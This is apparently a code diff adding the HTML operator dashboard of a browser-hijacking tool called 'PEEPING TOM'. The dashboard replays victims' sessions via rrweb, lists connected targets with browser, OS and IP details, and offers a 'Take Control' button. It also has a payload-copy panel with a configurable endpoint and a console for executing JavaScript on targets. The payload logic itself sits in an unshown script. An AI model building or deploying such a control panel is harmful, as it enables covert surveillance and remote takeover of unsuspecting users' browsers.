@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PEEPING TOM // OPERATIONS</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/rrweb@1.1.3/dist/rrweb.min.css" />
+    <script src="https://cdn.jsdelivr.net/npm/rrweb@1.1.3/dist/rrweb.min.js"></script>
+    <script src="/socket.io/socket.io.js"></script>
+    
+    <link rel="stylesheet" href="/css/operator.css">
+</head>
+<body>
+
+    <header>
+        <div class="header-left">
+            <div class="brand">PEEPING TOM<span>// Operations</span></div>
+            <button id="btn-history" class="btn-action" style="width: auto; padding: 8px 16px; margin: 0;" onclick="openHistory()">Connection Logs</button>
+        </div>
+
+        <!-- NEW: Grouped Status Badge and Logout Button -->
+        <div style="display: flex; gap: 16px; align-items: center;">
+            <div class="status-badge">Awaiting Uplink</div>
+
+            <!-- Red tactical logout button -->
+            <button class="btn-action" style="width: auto; padding: 6px 12px; margin: 0; border-color: var(--border-subtle); color: var(--accent-danger);"
+                    onmouseover="this.style.borderColor='var(--accent-danger)'; this.style.background='rgba(248, 81, 73, 0.1)';"
+                    onmouseout="this.style.borderColor='var(--border-subtle)'; this.style.background='transparent';"
+                    onclick="window.location.href='/logout'">
+                ⏻ LOGOUT
+            </button>
+        </div>
+    </header>
+
+
+    <main>
+        <aside id="left-panel">
+            <div class="panel-section">
+                <h3>Active Sessions</h3>
+                <ul id="session-list">
+                    <li style="padding:10px; font-size:0.8rem; color:#71717a; text-align:center;">No users connected</li>
+                </ul>
+            </div>
+
+            <div class="panel-section">
+                <h3>Device Information</h3>
+                <div id="deviceInfo">
+                    <div><b>Browser</b><br><span id="d-browser">Waiting...</span></div><br>
+                    <div><b>Operating System</b><br><span id="d-os">Waiting...</span></div><br>
+                    <div><b>Loaded From</b><br><span id="d-origin">Waiting...</span></div>
+                </div>
+                <button id="btn-request" class="btn-action" style="margin-bottom: 0;" disabled onclick="toggleControl()">Take Control</button>
+            </div>
+
+            <div class="terminal-container" style="flex: 1; margin-bottom: 0;">
+                <h3>System Telemetry</h3>
+                <div id="telemetry-terminal" class="terminal-output">
+                    <div class="log-entry"><span class="log-time">[SYS]</span> Secure infrastructure online. Listening...</div>
+                </div>
+            </div>
+        </aside>
+
+	<div class="viewport-wrapper">
+            <div class="mirror-wrapper">
+                <div class="viewport-controls">
+                    <button id="btn-fullscreen" class="btn-action" style="width: auto; margin: 0;" onclick="toggleFullscreen()">⛶ Fullscreen</button>
+                </div>
+
+                <div id="mirror-container"></div>
+                <div id="interactive-overlay"></div>
+            </div>
+        </div>
+                <aside id="right-panel">
+            <div class="panel-section">
+                <h3>Payload Configuration</h3>
+                <label style="font-size: 0.72rem; color: var(--text-muted); display: block; margin-bottom: 8px; font-weight: 700; letter-spacing: 0.5px;">ENDPOINT DESTINATION</label>
+                <input id="inp-server-url" type="text" class="config-input" placeholder="http://192.168.1.X:3000">
+                <button id="btn-copy" class="btn-action" onclick="copyJsSnippet()">Copy Payload</button>
+
+                <hr style="border: none; border-top: 1px solid #202024; margin: 15px 0;">
+
+                <input type="file" id="module-upload" accept=".js" style="display: none;">
+                <button id="btn-load-module" class="btn-action" style="margin-bottom: 0;" onclick="document.getElementById('module-upload').click()">Load Javascript Module</button>
+            </div>
+
+            <div class="terminal-container" style="flex: 1; margin-bottom: 0;">
+                <h3>Browser Console Shell</h3>
+                <div id="console-terminal" class="terminal-output"></div>
+                <div style="display: flex; margin-top: auto; border-top: 1px solid #202024; padding-top: 15px;">
+                    <span style="color: var(--accent-yellow); font-family: 'JetBrains Mono', monospace; padding-right: 8px; font-weight: bold;">></span>
+                    <input id="cmd-input" type="text" placeholder="Execute JS on target..." style="flex: 1; background: transparent; border: none; color: var(--text-main); font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; outline: none;">
+                </div>
+            </div>
+        </aside>
+    </main>
+
+    <div id="history-modal">
+        <div class="history-content">
+            <div class="history-header">
+                <h2>Connection Intelligence Log</h2>
+                <button class="close-btn" onclick="document.getElementById('history-modal').style.display='none'">&times;</button>
+            </div>
+            <div class="table-wrapper">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Timestamp (UTC)</th>
+                            <th>IP Address</th>
+                            <th>Origin Domain</th>
+                            <th>Operating System</th>
+                            <th>Browser</th>
+                        </tr>
+                    </thead>
+                    <tbody id="history-table-body">
+                        </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <script src="/js/operator.js"></script>
+</body>
+</html>
